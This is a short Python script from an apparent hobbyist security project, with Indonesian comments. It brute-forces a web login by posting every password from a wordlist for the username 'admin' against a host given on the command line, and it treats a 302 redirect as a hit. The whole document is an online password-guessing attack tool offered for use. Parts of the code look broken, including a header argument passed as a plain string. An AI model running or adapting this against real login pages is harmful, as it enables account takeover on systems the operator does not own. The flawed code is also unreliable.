# LunaticTech LAB


import requests
import sys
url ="http://"+sys.argv[1]
path_wordlist = sys.argv[2]
user_agent = "DwiyanLab Browser V1.0/LunaticWebKit"


def brute(username,password):
    try:
        data = {'username':username,'password':password} # Bagian Cek Data
        req = requests.post(url,data=data ,allow_redirects=False,headers=user_agent) # Allow Redirect False Untuk Mendapatkan Response 302
        if req.status_code == 302 :
            print("Your Username "+username+" Your Password "+password)
        else :
            print("Checking Passowrd : "+password)
    except requests.exceptions.RequestException as error:
        print("Exception Handler : "+error.strerror)
        sys.exit()

def internetcheck():
    req = requests.get(url)
    if req.status_code == 200:
        return True
    else :
        return False

print("\n| LunaticTech BruteForce\n"
      "| Github.com/DwiyanTech\n"
      "| LunaticTech LAB\n")
if internetcheck():
    word = [word.strip() for word in open(path_wordlist,'r').readlines()]

    for password in word:
        brute('admin',password)
else:
    print("No Internet Connection")
    sys.exit()
